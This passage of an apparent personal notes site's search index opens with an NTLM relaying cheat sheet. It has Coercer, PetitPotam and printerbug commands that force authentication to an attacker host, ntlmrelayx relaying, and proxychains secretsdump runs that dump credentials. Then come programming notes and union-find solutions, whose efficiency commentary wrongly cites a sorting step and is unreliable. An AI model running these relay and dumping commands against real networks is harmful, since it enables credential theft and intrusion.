/&gt;\n</code></pre>"},{"location":"pentesting/relaying/#for-other-filetypes-check-out-the-tools-listed","title":"For other filetypes check out the tools listed","text":""},{"location":"pentesting/relaying/#coercing","title":"Coercing","text":"<ul> <li>https://github.com/p0dalirius/Coercer</li> </ul>"},{"location":"pentesting/relaying/#check-which-coercer-methods-are-available","title":"Check which coercer methods are available","text":"<pre><code>python3 Coercer.py scan -t &lt;TARGET IP&gt; -u &lt;USER&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN&gt;\n</code></pre>"},{"location":"pentesting/relaying/#force-auth-to-attacker-ip","title":"Force auth to attacker IP","text":"<pre><code>python3 Coercer.py coerse -L &lt;ATTACKER IP&gt; -t &lt;TARGET IP&gt; -u &lt;USER&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN&gt;\n</code></pre>"},{"location":"pentesting/relaying/#webdav-auth","title":"WEBDAV auth","text":"<ul> <li>https://github.com/topotam/PetitPotam</li> <li>https://github.com/dirkjanm/krbrelayx</li> <li>Creates a <code>[WebDAV] NTLMv2 Hash</code> in responder, <code>HTTPD: received</code> in ntlmrelayx. Can be used against relaying to ldap, ldaps.</li> <li>Will authenticate to our attacking machine as the computer account. Can be used for RBCD. <pre><code>python3 PetitPotam.py -d &lt;DOMAIN&gt; -u &lt;USER&gt; -p &lt;PASSWORD&gt; &lt;HOSTNAME ATTACKER MACHINE&gt;@80/a &lt;TARGET&gt;\n\npython3 printerbug.py &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;TARGET&gt; &lt;HOSTNAME ATTACKER MACHINE&gt;@80/a\n</code></pre></li> </ul>"},{"location":"pentesting/relaying/#relaying","title":"Relaying","text":""},{"location":"pentesting/relaying/#smb-relaying","title":"SMB relaying","text":"<ul> <li>Requirement: Only possible to hosts without SMB Signing</li> </ul>"},{"location":"pentesting/relaying/#check-for-smb-hosts-without-smb-signing","title":"Check for SMB hosts without SMB signing","text":"<pre><code>crackmapexec smb &lt;IP RANGE&gt; --gen-relay-list smb_hosts_nosigning.txt\n</code></pre>"},{"location":"pentesting/relaying/#relay-requests-smb-and-dump-sam","title":"Relay requests SMB and dump SAM","text":"<ul> <li>We have to modify the <code>/etc/responder/Responder.conf</code> file and disable the HTTP and SMB servers (as NTLM relay will be our SMB and HTTP server).</li> <li>the <code>-d</code> flag has now been changed from \u201cEnable answers for NETBIOS domain suffix queries. Answering to domain suffixes will likely break stuff on the network. Default: False\u201d to \u201cEnable answers for DHCP broadcast requests. This option will inject a WPAD server in the DHCP response. Default: False\u201d. It should also be noted that <code>-d</code> as it is now CAN have an impact on your client\u2019s network, as you are effectively poisoning the WPAD file over DHCP, which does not always revert back immediately once you stop the attack. It will likely require a reboot. <pre><code>ntlmrelayx.py -tf smb_hosts_nosigning.txt -smb2support\n</code></pre></li> </ul>"},{"location":"pentesting/relaying/#relay-requests-smb-and-keep-smb-sessions-open","title":"Relay requests SMB and keep SMB sessions open","text":"<ul> <li>Use the <code>socks</code> option to be able to use the <code>socks</code> command to get a nice overview of the relayed attempts. It will also keep the SMB connection open indefinitely. </li> <li>The file <code>smb_hosts_nosigning.txt</code> should only contain IP's, FQDN doesn't work, see issue <pre><code>ntlmrelayx.py -tf smb_hosts_nosigning.txt -socks -smb2support\n\n# Get overview of all relay attempts\nntlmrelayx&gt; socks\n\n# Change socks proxy\nsudo vim /etc/proxychains4.conf\nsocks4 127.0.0.1 1080\n\n# Use proxychains and it will ignore the password value and use the relay credential instead\nproxychains python3 secretsdump.py &lt;DOMAIN&gt;/&lt;USER&gt;:IDontCareAboutPassword@&lt;TARGET&gt;\n\n# Also possible to access shares on the network, for example if user is not local admin\nproxychains python3 smbclient.py &lt;DOMAIN&gt;/&lt;USER&gt;:IDontCareAboutPassword@&lt;TARGET&gt;\n</code></pre></li> </ul>"},{"location":"pentesting/relaying/#ldap-relaying","title":"LDAP Relaying","text":"<ul> <li>Requires LDAP signing or LDAPS Binding to be turned off (default).</li> </ul>"},{"location":"pentesting/relaying/#check-ldap-signing-or-binding","title":"Check LDAP Signing or Binding","text":"<ul> <li>https://github.com/zyn3rgy/LdapRelayScan <pre><code>python3 LdapRelayScan.py -method BOTH -dc-ip &lt;IP&gt; -u &lt;USER&gt; -p &lt;PASSWORD&gt;\n\ncme ldap &lt;DC IP&gt; -u &lt;USER&gt; -p &lt;PASSWORD&gt; -M ldap-checker\n</code></pre></li> </ul>"},{"location":"pentesting/relaying/#resource-based-constraind-delegation-attacks","title":"Resource Based Constraind Delegation attacks","text":"<ul> <li>Webclient Attack</li> <li>Change-Lockscreen</li> </ul>"},{"location":"programming/","title":"prog home","text":"<pre><code>graph LR\n    A[Data Structures and Algorithms] --&gt; B[Data Structures]\n    A --&gt; C[Algorithms]\n\n    B --&gt; D[Linear Data Structures]\n    B --&gt; E[Non-Linear Data Structures]\n\n    D --&gt; F[Array]\n    D --&gt; G[Linked List]\n    D --&gt; H[Stack]\n    D --&gt; I[Queue]\n    D --&gt; J[Deque]\n    D --&gt; K[Circular Queue]\n    D --&gt; L[Skip List]\n\n    E --&gt; M[Tree]\n    E --&gt; N[Graph]\n    E --&gt; O[Heap]\n    E --&gt; P[Trie]\n    E --&gt; Q[Disjoint Set]\n    E --&gt; R[Suffix Tree]\n\n    M --&gt; S[Binary Tree]\n    M --&gt; T[Binary Search Tree]\n    M --&gt; U[AVL Tree]\n    M --&gt; V[Red-Black Tree]\n    M --&gt; W[B-Tree]\n    M --&gt; X[Segment Tree]\n    M --&gt; Y[Interval Tree]\n    M --&gt; Z[Fenwick Tree]\n    M --&gt; AA[KD-Tree]\n\n    N --&gt; AB[Directed Graph]\n    N --&gt; AC[Undirected Graph]\n    N --&gt; AD[Weighted Graph]\n    N --&gt; AE[Unweighted Graph]\n    N --&gt; AF[DFS]\n    N --&gt; AG[BFS]\n    N --&gt; AH[Dijkstra's Algorithm]\n    N --&gt; AI[Bellman-Ford Algorithm]\n    N --&gt; AJ[Floyd-Warshall Algorithm]\n    N --&gt; AK[Kruskal's Algorithm]\n    N --&gt; AL[Prim's Algorithm]\n    N --&gt; AM[Topological Sorting]\n\n    O --&gt; AN[Min-Heap]\n    O --&gt; AO[Max-Heap]\n\n    C --&gt; AP[Sorting]\n    C --&gt; AQ[Searching]\n    C --&gt; AR[Dynamic Programming]\n    C --&gt; AS[Greedy Algorithms]\n    C --&gt; AT[Divide and Conquer]\n    C --&gt; AU[Backtracking]\n    C --&gt; AV[String Algorithms]\n    C --&gt; AW[Mathematical Algorithms]\n    C --&gt; AX[Amortized Analysis]\n    C --&gt; AY[Approximation Algorithms]\n    C --&gt; AZ[Randomized Algorithms]\n    C --&gt; BA[Parallel Algorithms]\n    C --&gt; BB[Cache-Oblivious Algorithms]\n    C --&gt; BC[Streaming Algorithms]\n\n    AP --&gt; BD[Bubble Sort]\n    AP --&gt; BE[Selection Sort]\n    AP --&gt; BF[Insertion Sort]\n    AP --&gt; BG[Merge Sort]\n    AP --&gt; BH[Quick Sort]\n    AP --&gt; BI[Heap Sort]\n    AP --&gt; BJ[Shell Sort]\n    AP --&gt; BK[Radix Sort]\n    AP --&gt; BL[Counting Sort]\n    AP --&gt; BM[Bucket Sort]\n\n    AQ --&gt; BN[Linear Search]\n    AQ --&gt; BO[Binary Search]\n    AQ --&gt; BP[Exponential Search]\n    AQ --&gt; BQ[Interpolation Search]\n    AQ --&gt; BR[Ternary Search]\n\n    AR --&gt; BS[Memoization]\n    AR --&gt; BT[Tabulation]\n    AR --&gt; BU[LCS]\n    AR --&gt; BV[LIS]\n    AR --&gt; BW[Matrix Chain Multiplication]\n\n    AS --&gt; BX[Knapsack Problem]\n    AS --&gt; BY[Huffman Coding]\n    AS --&gt; BZ[Activity Selection Problem]\n    AS --&gt; CA[Kruskal\u2019s Algorithm]\n    AS --&gt; CB[Prim\u2019s Algorithm]\n\n    AT --&gt; CC[Merge Sort]\n    AT --&gt; CD[Quick Sort]\n    AT --&gt; CE[Karatsuba Algorithm]\n    AT --&gt; CF[Strassen\u2019s Algorithm]\n\n    AU --&gt; CG[Sudoku Solver]\n    AU --&gt; CH[Subset Sum]\n    AU --&gt; CI[N-Queens Problem]\n    AU --&gt; CJ[Hamiltonian Cycle]\n    AU --&gt; CK[Knight\u2019s Tour]\n\n    AV --&gt; CL[KMP]\n    AV --&gt; CM[Rabin-Karp]\n    AV --&gt; CN[Boyer-Moore]\n    AV --&gt; CO[Z Algorithm]\n\n    AW --&gt; CP[Euclidean Algorithm for GCD]\n    AW --&gt; CQ[Sieve of Eratosthenes]\n    AW --&gt; CR[Matrix Exponentiation]</code></pre>"},{"location":"programming/Booking%20API%20C%23/","title":"Booking API","text":""},{"location":"programming/Booking%20API%20C%23/#exploring-the-bookingapi-a-comprehensive-overview","title":"Exploring the BookingAPI: A Comprehensive Overview","text":"<p>The BookingAPI on GitHub, developed by cuhawk, is an open-source project aimed at managing bookings efficiently. This C#-based application sets up its production environment with a base URL <code>https://localhost:7197</code>, as configured in the <code>environment.ts</code> file.</p>"},{"location":"programming/Booking%20API%20C%23/#key-features","title":"Key Features:","text":"<ol> <li>API Structure:</li> <li>The API follows RESTful principles, ensuring that it is stateless and scalable.</li> <li> <p>It provides endpoints for creating, retrieving, updating, and deleting bookings.</p> </li> <li> <p>Configuration:</p> </li> <li> <p>The project includes an <code>environment.ts</code> file for setting up the production environment. By default, this points to <code>https://localhost:7197</code>.</p> </li> <li> <p>Development Stack:</p> </li> <li> <p>The backend is developed using C#, leveraging the robustness of the .NET framework.</p> </li> <li> <p>Usage:</p> </li> <li> <p>Ideal for businesses that need a booking system, such as hotels, restaurants, or any service requiring reservations.</p> </li> <li> <p>Deployment:</p> </li> <li>Though the repository's README lacks detailed deployment instructions, typical .NET applications can be deployed on various platforms, including cloud services like Azure.</li> </ol>"},{"location":"programming/Booking%20API%20C%23/#getting-started","title":"Getting Started:","text":"<ol> <li>Clone the Repository:</li> <li>Use <code>git clone https://github.com/cuhawk/BookingAPI.git</code> to clone the repository.</li> <li>Setup:</li> <li>Ensure the necessary environment configurations are set in <code>environment.ts</code>.</li> <li>Run the Application:</li> <li>Use the .NET CLI or Visual Studio to run the application.</li> </ol>"},{"location":"programming/Booking%20API%20C%23/#community-and-contributions","title":"Community and Contributions:","text":"<ul> <li>The project welcomes contributions. Developers can fork the repository, create a new branch, and submit pull requests for review.</li> </ul> <p>For more detailed information and to explore the source code, visit the BookingAPI GitHub repository. This project is an excellent resource for developers looking to implement a booking system or learn more about API development with C#.</p>"},{"location":"programming/DSA/","title":"DSA","text":"<p>Recursion is generally easier to implement in Depth-First Search (DFS) than in Breadth-First Search (BFS) due to the inherent nature of the two algorithms and how they traverse data structures such as trees or graphs. Here\u2019s why:</p>"},{"location":"programming/DSA/#depth-first-search-dfs","title":"Depth-First Search (DFS)","text":"<ul> <li>Nature of DFS: DFS explores as far down a branch as possible before backtracking. This behavior aligns well with the Last-In-First-Out (LIFO) principle of recursion.</li> <li>Call Stack Alignment: Recursion naturally uses the call stack to manage traversal. Each recursive call dives deeper into a branch, and when a branch is fully explored, the call stack unwinds, handling the backtracking automatically.</li> <li>Simplicity: Implementing DFS recursively is straightforward:   <pre><code>def dfs(node):\n    if node is None:\n        return\n    process(node)\n    for each child in node.children:\n        dfs(child)\n</code></pre>   This code snippet captures the essence of DFS without needing explicit data structures beyond the call stack.</li> </ul>"},{"location":"programming/DSA/#breadth-first-search-bfs","title":"Breadth-First Search (BFS)","text":"<ul> <li>Nature of BFS: BFS explores all nodes at the present depth level before moving on to nodes at the next depth level. This requires a First-In-First-Out (FIFO) structure, typically implemented with a queue.</li> <li>Non-alignment with Call Stack: The FIFO nature of BFS does not align well with the LIFO behavior of the call stack. Therefore, recursion (which relies on the call stack) is not a natural fit for BFS.</li> <li>Explicit Data Structure Requirement: Implementing BFS requires managing a queue explicitly, which adds complexity:   <pre><code>from collections import deque\n\ndef bfs(start_node):\n    queue = deque([start_node])\n    while queue:\n        node = queue.popleft()\n        process(node)\n        for each child in node.children:\n            queue.append(child)\n</code></pre>   Here, the explicit use of a queue ensures the FIFO order necessary for BFS, which is more complex compared to the straightforward recursive DFS.</li> </ul>"},{"location":"programming/DSA/#summary","title":"Summary","text":"<p>In summary, the natural alignment of DFS with the call stack makes recursion a straightforward and elegant solution for implementing DFS. In contrast, BFS\u2019s need for a FIFO order necessitates an explicit queue, making recursion less suitable and more complex to implement.</p>"},{"location":"programming/GameServer/","title":"Game Server","text":""},{"location":"programming/GameServer/#exploring-the-gamesserver-project-an-interactive-c-game-server","title":"Exploring the GamesServer Project: An Interactive C++ Game Server","text":"<p>The GamesServer project by cuhawk is an impressive implementation of an interactive game server built using C++. This project is designed to host and manage classic board games such as Tic-Tac-Toe and Catch the Bunny. Here\u2019s a detailed look at its features and architecture.</p>"},{"location":"programming/GameServer/#key-features","title":"Key Features","text":"<ol> <li> <p>Game Variety:</p> <ul> <li>Tic-Tac-Toe: The classic game that requires strategic placement of Xs and Os.</li> <li>Catch the Bunny: A more dynamic game where players attempt to outmaneuver each other.</li> </ul> </li> <li> <p>User Interface Options:</p> <ul> <li>Console: For users who prefer a text-based interaction.</li> <li>Graphical: A more visually appealing interface for an enhanced user experience.</li> </ul> </li> <li> <p>Difficulty Levels:</p> <ul> <li>Easy: Suitable for beginners.</li> <li>Medium: Offers a more challenging experience.</li> <li>The architecture allows for additional difficulty levels to be integrated seamlessly.</li> </ul> </li> </ol>"},{"location":"programming/GameServer/#technical-architecture","title":"Technical Architecture","text":"<ol> <li>Programming Language: The server is implemented in C++, leveraging the language's efficiency and control.</li> <li>Design Patterns: Utilizes established design patterns for maintainability and scalability.</li> <li>Standard Template Library (STL): Employs STL for efficient data management.</li> <li>Model-View-Controller (MVC) Pattern: <ul> <li>Model: Manages game logic and data.</li> <li>View: Handles display and user interaction.</li> <li>Controller: Facilitates communication between the Model and View.</li> </ul> </li> </ol>"},{"location":"programming/GameServer/#components","title":"Components","text":"<ol> <li>BoardGameController: The central controller that manages game states, player interactions, and transitions between different game phases.</li> <li>Game Algorithms: Implements the logic and rules for each game, ensuring fair play and accurate game mechanics.</li> </ol>"},{"location":"programming/GameServer/#how-it-works","title":"How It Works","text":"<p>When a player selects a game, the GamesServer initializes the game environment, setting up the board and players. Depending on the selected difficulty, the game controller adjusts the complexity of the opponent\u2019s moves. Players can interact with the game via either the console or the graphical interface, depending on their preference. The MVC architecture ensures that changes in the game state are accurately reflected in the user interface, providing a seamless gaming experience.</p>"},{"location":"programming/GameServer/#conclusion","title":"Conclusion","text":"<p>The GamesServer project is an excellent demonstration of using C++ for building interactive applications. Its use of design patterns and MVC architecture makes it both a fun and educational project for developers looking to enhance their understanding of game development and software architecture. </p>"},{"location":"programming/Maximize%20shortcut%20nodes/","title":"Remove Max Number of Edges to Keep Graph Fully Traversable","text":"<p>Alice and Bob have an undirected graph of n nodes and three types of edges:</p> <p>Type 1: Can be traversed by Alice only. Type 2: Can be traversed by Bob only. Type 3: Can be traversed by both Alice and Bob. Given an array edges where edges[i] = [typei, ui, vi] represents a bidirectional edge of type typei between nodes ui and vi, find the maximum number of edges you can remove so that after removing the edges, the graph can still be fully traversed by both Alice and Bob. The graph is fully traversed by Alice and Bob if starting from any node, they can reach all other nodes.</p> <p>Return the maximum number of edges you can remove, or return -1 if Alice and Bob cannot fully traverse the graph.</p> <p>Constraints:</p> <p>1 &lt;= n &lt;= 105 1 &lt;= edges.length &lt;= min(105, 3 * n * (n - 1) / 2) edges[i].length == 3 1 &lt;= typei &lt;= 3 1 &lt;= ui &lt; vi &lt;= n All tuples (typei, ui, vi) are distinct.</p> <pre><code>class UnionFind {\n    vector&lt;int&gt; representative;\n    vector&lt;int&gt; componentSize;\n    int components;\n\npublic:\n    UnionFind(int n) {\n        components = n;\n        for (int i = 0; i &lt;= n; i++) {\n            representative.push_back(i);\n            componentSize.push_back(1);\n        }\n    }\n\n    int findRepresentative(int x) {\n        if (representative[x] == x) return x;\n\n        return representative[x] = findRepresentative(representative[x]);\n    }\n\n    int performUnion(int x, int y) {\n        x = findRepresentative(x), y = findRepresentative(y);\n\n        if (x == y) return 0;\n\n        if (componentSize[x] &gt; componentSize[y]) {\n            componentSize[x] += componentSize[y];\n            representative[y] = x;\n        } else {\n            componentSize[y] += componentSize[x];\n            representative[x] = y;\n        }\n\n        components--;\n        return 1;\n    }\n\n    bool isConnected() {\n        return components == 1;\n    }\n};\n\nclass Solution {\npublic:\n    int maxNumEdgesToRemove(int n, vector&lt;vector&lt;int&gt;&gt;&amp; edges) {\n        UnionFind Alice(n), Bob(n);\n\n        int edgesRequired = 0;\n\n        for (auto edge : edges)\n            if (edge[0] == 3)\n                edgesRequired += (Alice.performUnion(edge[1], edge[2]) | Bob.performUnion(edge[1], edge[2]));\n\n        for (auto edge : edges) {\n            if (edge[0] == 1) edgesRequired += Alice.performUnion(edge[1], edge[2]);\n            else if (edge[0] == 2) edgesRequired += Bob.performUnion(edge[1], edge[2]);\n        }\n\n        if (Alice.isConnected() &amp;&amp; Bob.isConnected()) return edges.size() - edgesRequired;\n\n        return -1;\n    }\n};\n</code></pre> <p>runtime efficient solution:</p> <pre><code>class DisjointSet {\n    vector&lt;int&gt; rank, parent, size;\n\npublic:\n    DisjointSet(int n) {\n        rank.resize(n + 1, 0);\n        parent.resize(n + 1);\n        size.resize(n + 1);\n        for (int i = 0; i &lt;= n; i++) {\n            parent[i] = i;\n            size[i] = 1;\n        }\n    }\n\n    int findUPar(int node) {\n        if (node == parent[node])\n            return node;\n        return parent[node] = findUPar(parent[node]);\n    }\n\n    void unionByRank(int u, int v) {\n        int ulp_u = findUPar(u);\n        int ulp_v = findUPar(v);\n        if (ulp_u == ulp_v)\n            return;\n        if (rank[ulp_u] &lt; rank[ulp_v]) {\n            parent[ulp_u] = ulp_v;\n        } else if (rank[ulp_v] &lt; rank[ulp_u]) {\n            parent[ulp_v] = ulp_u;\n        } else {\n            parent[ulp_v] = ulp_u;\n            rank[ulp_u]++;\n        }\n    }\n\n    void unionBySize(int u, int v) {\n        int ulp_u = findUPar(u);\n        int ulp_v = findUPar(v);\n        if (ulp_u == ulp_v)\n            return;\n        if (size[ulp_u] &lt; size[ulp_v]) {\n            parent[ulp_u] = ulp_v;\n            size[ulp_v] += size[ulp_u];\n        } else {\n            parent[ulp_v] = ulp_u;\n            size[ulp_u] += size[ulp_v];\n        }\n    }\n};\nclass Solution {\npublic:\n    int maxNumEdgesToRemove(int n, vector&lt;vector&lt;int&gt;&gt;&amp; edges) {\n        ios_base::sync_with_stdio(false);\n        DisjointSet ds1(n+1);\n        DisjointSet ds2(n+1);\n        int cnt = 0;\n        for (auto&amp; e : edges) {\n            if (e[0] == 3) {\n                if ((ds1.findUPar(e[1]) == ds1.findUPar(e[2])) &amp;&amp;\n                    (ds2.findUPar(e[1]) == ds2.findUPar(e[2]))) {\n                    cnt++;\n                } else {\n                    ds1.unionByRank(e[1], e[2]);\n                    ds2.unionByRank(e[1], e[2]);\n                }\n            }\n        }\n        for (auto&amp; e : edges) {\n            if (e[0] == 1) {\n                if ((ds1.findUPar(e[1]) == ds1.findUPar(e[2]))) {\n                    cnt++;\n                } else {\n                    ds1.unionByRank(e[1], e[2]);\n                }\n            } else if (e[0] == 2) {\n                if ((ds2.findUPar(e[1]) == ds2.findUPar(e[2]))) {\n                    cnt++;\n                } else {\n                    ds2.unionByRank(e[1], e[2]);\n                }\n            }\n        }\n        int ct1=0;\n        int ct2=0;\n        for(int i=1; i&lt;=n; i++)\n        {\n            if(ds1.findUPar(i)==i)\n            {\n                ct1++;\n            }\n            if(ds2.findUPar(i)==i)\n            {\n                ct2++;\n            }\n        }\n        if(ct1&gt;1 || ct2&gt;1)\n        {\n            return -1;\n        }\n\n        return cnt;\n    }\n};\n</code></pre> <p>The second implementation of the solution is considered more efficient than the first due to several reasons related to the data structures used and the specific optimizations applied. Here's a detailed comparison of the key differences and why they contribute to the efficiency:</p>"},{"location":"programming/Maximize%20shortcut%20nodes/#1-data-structure-union-find-with-path-compression-and-union-by-ranksize","title":"1. Data Structure: Union-Find with Path Compression and Union by Rank/Size","text":"<p>First Implementation (UnionFind Class): - Uses a straightforward Union-Find data structure with path compression and union by size. - Path compression optimizes the <code>findRepresentative</code> method by making nodes point directly to the root representative, reducing the time complexity for future queries. - Union by size ensures that the smaller tree is always merged into the larger tree, balancing the tree height and improving efficiency.</p> <p>Second Implementation (DisjointSet Class): - Enhances the Union-Find data structure by using both union by rank and union by size, providing flexibility and ensuring optimal tree balancing. - The use of <code>rank</code> ensures that the tree height remains logarithmic, further optimizing the union operation. - Path compression is also applied in the <code>findUPar</code> method, similar to the first implementation, but with the addition of rank-based optimization, it is slightly more efficient.</p>"},{"location":"programming/Maximize%20shortcut%20nodes/#2-handling-of-union-operations","title":"2. Handling of Union Operations","text":"<p>First Implementation: - Separately performs union operations for Alice and Bob using the <code>performUnion</code> method. - Checks for the edge type (1 for Alice, 2 for Bob, 3 for both) and applies union operations accordingly. - The union operations are done sequentially, which might lead to repetitive checks and operations.</p> <p>Second Implementation: - Combines the union operations for both Alice and Bob more efficiently by checking the type of edge once and applying the union operations using rank. - Uses a single loop to handle type 3 edges first, ensuring both Alice and Bob's sets are updated simultaneously, reducing redundant operations. - Additional loops for type 1 and type 2 edges ensure specific union operations for Alice and Bob without redundant checks.</p>"},{"location":"programming/Maximize%20shortcut%20nodes/#3-edge-counting-and-connectivity-check","title":"3. Edge Counting and Connectivity Check","text":"<p>First Implementation: - Uses the <code>components</code> variable to keep track of the number of components and checks connectivity with <code>isConnected</code>. - Manages the number of required edges separately for Alice and Bob, leading to a slightly more complex counting mechanism.</p> <p>Second Implementation: - Directly counts redundant edges (<code>cnt</code>) during the union operations, simplifying the edge counting process. - After processing all edges, it checks the number of connected components by counting unique parents in both sets, ensuring both Alice and Bob are fully connected. - This approach simplifies the final connectivity check and reduces the number of operations needed.</p>"},{"location":"programming/Maximize%20shortcut%20nodes/#conclusion","title":"Conclusion","text":"<p>The second implementation is more efficient primarily due to: - The use of both union by rank and union by size, which provides better tree balancing and reduces the height of the trees. - A more streamlined process for handling union operations, especially for type 3 edges, reducing redundant operations and checks. - Simplified edge counting and connectivity check, which reduces the complexity and number of operations.</p> <p>These optimizations lead to faster execution times, especially for larger inputs, making the second implementation more efficient.</p> <p>Runtime efficient 2:</p> <pre><code>class DisjointSet{\npublic: \n    vector&lt;int&gt; parent;\n    vector&lt;int&gt; rank;\n\n    DisjointSet(int n){\n        parent.resize(n);\n        rank.resize(n, 0);\n\n        for (int i = 0; i &lt; n; i++){\n            parent[i] = i;\n        }\n    }\n\n    int getUltParent(int node){\n        node = parent[node];\n        while (node != parent[node]){\n            parent[node] = parent[parent[node]];\n            node = parent[node];\n        }\n        return node;\n    }\n\n    bool unionByRank(int n1, int n2){\n        int p1 = getUltParent(n1);\n        int p2 = getUltParent(n2);\n\n        if (p1 == p2) return false;\n\n        int rank1 = rank[p1];\n        int rank2 = rank[p2];\n\n        if (rank1 == rank2){\n            parent[p2] = p1;\n            rank[p1]++;\n        }\n        else if (rank1 &gt; rank2){\n            parent[p2] = p1;\n        }\n        else{\n            parent[p1] = p2; \n        }\n\n        return true;\n    }\n};\n\nclass Solution {\nprivate:\n    bool isConnectedGraph(DisjointSet *ds){\n        int n = ds-&gt;parent.size();\n        int numComponents = 0;\n        for (int i = 0; i &lt; n; i++){\n            if (ds-&gt;parent[i] == i) numComponents++;\n        }\n        return numComponents == 1;\n    }\n\n    int setInsert(DisjointSet *ds, vector&lt;vector&lt;int&gt;&gt;&amp; edges, int edgeType){\n        int numRemovals = 0;\n\n        for (const vector&lt;int&gt;&amp; edge : edges){\n            if (edge[0] != edgeType) continue;\n            if (ds-&gt;unionByRank(edge[1] - 1, edge[2] - 1) == false){\n                numRemovals++;\n            }\n        }\n        return numRemovals; \n    }\npublic:\n    int maxNumEdgesToRemove(int n, vector&lt;vector&lt;int&gt;&gt;&amp; edges) {\n        DisjointSet *Alice = new DisjointSet(n);\n        DisjointSet *Bob = new DisjointSet(n);\n        int numRemovals = 0;\n\n        numRemovals += setInsert(Alice, edges, 3);\n        setInsert(Bob, edges, 3);\n\n        numRemovals += setInsert(Alice, edges, 1);\n        numRemovals += setInsert(Bob, edges, 2);\n\n        if (!isConnectedGraph(Alice) || !isConnectedGraph(Bob)) return -1;\n        return numRemovals;\n    }\n};\n</code></pre> <p>The provided implementation of the <code>Solution</code> class leverages a Disjoint Set Union (DSU) structure to solve the problem efficiently. Here\u2019s an analysis of its runtime efficiency:</p>"},{"location":"programming/Maximize%20shortcut%20nodes/#key-features-of-the-implementation","title":"Key Features of the Implementation","text":"<ol> <li>DisjointSet Class:</li> <li> <p>Initialization:      <pre><code>DisjointSet(int n){\n    parent.resize(n);\n    rank.resize(n, 0);\n    for (int i = 0; i &lt; n; i++){\n        parent[i] = i;\n    }\n}\n</code></pre>      The DSU is initialized with <code>parent</code> and <code>rank</code> vectors, ensuring all nodes are their own parents initially, and all ranks are set to zero.</p> </li> <li> <p>Find with Path Compression:      <pre><code>int getUltParent(int node){\n    node = parent[node];\n    while (node != parent[node]){\n        parent[node] = parent[parent[node]];\n        node = parent[node];\n    }\n    return node;\n}\n</code></pre>      The <code>getUltParent</code> method uses path compression to keep the tree flat, which ensures that future <code>find</code> operations are fast.</p> </li> <li> <p>Union by Rank:      <pre><code>bool unionByRank(int n1, int n2){\n    int p1 = getUltParent(n1);\n    int p2 = getUltParent(n2);\n    if (p1 == p2) return false;\n\n    if (rank[p1] == rank[p2]){\n        parent[p2] = p1;\n        rank[p1]++;\n    } else if (rank[p1] &gt; rank[p2]){\n        parent[p2] = p1;\n    } else {\n        parent[p1] = p2; \n    }\n    return true;\n}\n</code></pre>      The <code>unionByRank</code> method merges two sets by their rank, which ensures the smaller tree is added under the root of the larger tree, maintaining balance.</p> </li> <li> <p>Solution Class:</p> </li> <li> <p>Edge Processing:      <pre><code>int setInsert(DisjointSet *ds, vector&lt;vector&lt;int&gt;&gt;&amp; edges, int edgeType){\n    int numRemovals = 0;\n    for (const vector&lt;int&gt;&amp; edge : edges){\n        if (edge[0] != edgeType) continue;\n        if (ds-&gt;unionByRank(edge[1] - 1, edge[2] - 1) == false){\n            numRemovals++;\n        }\n    }\n    return numRemovals; \n}\n</code></pre>      The <code>setInsert</code> method processes edges of a particular type and tries to merge the sets. If the sets are already connected, it counts the edge as redundant.</p> </li> <li> <p>Connectivity Check:      <pre><code>bool isConnectedGraph(DisjointSet *ds){\n    int n = ds-&gt;parent.size();\n    int numComponents = 0;\n    for (int i = 0; i &lt; n; i++){\n        if (ds-&gt;parent[i] == i) numComponents++;\n    }\n    return numComponents == 1;\n}\n</code></pre>      The <code>isConnectedGraph</code> method checks if there is exactly one connected component, meaning the graph is fully connected.</p> </li> <li> <p>Main Logic:      <pre><code>int maxNumEdgesToRemove(int n, vector&lt;vector&lt;int&gt;&gt;&amp; edges) {\n    DisjointSet *Alice = new DisjointSet(n);\n    DisjointSet *Bob = new DisjointSet(n);\n    int numRemovals = 0;\n\n    numRemovals += setInsert(Alice, edges, 3);\n    setInsert(Bob, edges, 3);\n    numRemovals += setInsert(Alice, edges, 1);\n    numRemovals += setInsert(Bob, edges, 2);\n\n    if (!isConnectedGraph(Alice) || !isConnectedGraph(Bob)) return -1;\n    return numRemovals;\n}\n</code></pre></p> </li> </ol>"},{"location":"programming/Maximize%20shortcut%20nodes/#runtime-efficiency","title":"Runtime Efficiency","text":"<ul> <li>Time Complexity:</li> <li>Initialization: Initializing the DSU structures takes O(n) time.</li> <li>Sorting: Sorting the edges takes O(m log m) time, where m is the number of edges.</li> <li>Edge Processing: Processing each edge involves <code>find</code> and <code>union</code> operations, both of which are nearly constant time, i.e., O(\u03b1(n)), where \u03b1 is the inverse Ackermann function, which is very slow-growing. Since each edge is processed at most once, this part takes O(m \u03b1(n)) time.</li> </ul> <p>The overall time complexity is dominated by the sorting step, so it is O(m log m + m \u03b1(n)). Given that \u03b1(n) is very small, it is effectively O(m log m).</p> <ul> <li>Space Complexity:</li> <li>The space complexity is O(n) for the <code>parent</code> and <code>rank</code> vectors in each DSU instance, resulting in a total of O(n) space for each Alice and Bob structures.</li> </ul>"},{"location":"programming/Maximize%20shortcut%20nodes/#conclusion_1","title":"Conclusion","text":"<p>The solution is efficient in terms of both time and space. The use of DSU with path compression and union by rank ensures that operations are nearly constant time. The edge processing logic is streamlined by sorting and categorizing edges, ensuring that redundant edges are identified efficiently. The early termination check for connectivity further optimizes the runtime by potentially reducing unnecessary computations.</p> <p>Memory Efficient:</p> <pre><code>class Solution {\npublic:\n    int count=0;\n    int parent[100001];\n    int size[100001];\n    void make(int v){\n        parent[v]=v;\n        size[v]=1;\n    }\n    int find(int v){\n        if(v==parent[v]) return v;\n        return parent[v]=find(parent[v]);\n    }\n    bool merge(int a,int b){\n        a=find(a);\n        b=find(b);\n        if(a==b) return false;\n        if(size[b]&gt;size[a]) swap(a,b);\n        parent[b]=a;\n        size[a]+=size[b];\n        return true;\n    }\n    int maxNumEdgesToRemove(int n, vector&lt;vector&lt;int&gt;&gt;&amp; edges) {\n        sort(edges.begin(),edges.end());\n        reverse(edges.begin(),edges.end());\n        int count=0;\n        for(int i=1;i&lt;=n;i++){\n            make(i);\n        }\n        for(int i=0;i&lt;edges.size();i++){\n            int t=edges[i][0];\n            int u=edges[i][1];\n            int v=edges[i][2];\n            if(t==3 || t==2){\n                bool b=merge(u,v);\n                if(b==false) count++;\n            }\n        }\n        for(int i=1;i&lt;=n;i++){\n            if(find(1)!=find(i)) return -1;\n        }\n\n        for(int i=1;i&lt;=n;i++){\n            make(i);\n        }\n        for(int i=0;i&lt;edges.size();i++){\n            int 